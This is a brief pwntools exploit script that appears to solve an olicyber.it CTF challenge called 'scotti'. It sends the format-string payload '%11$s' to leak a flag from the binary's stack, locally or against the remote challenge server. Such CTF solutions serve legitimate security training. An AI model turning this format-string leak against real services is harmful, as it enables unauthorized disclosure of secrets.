from pwn import *

context.binary = elf = ELF('./scotti')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('scotti.challs.olicyber.it', 12202)
elif args.GDB:
    r = gdb.debug('./scotti', '''
                    b main
                    c
                ''', env={'FLAG': 'FLAG{NO}'})
else:
    r = process('./scotti', env={'FLAG': 'FLAG{NO}'})
    

r.sendlineafter(b'? ', b'%11$s')
r.interactive()
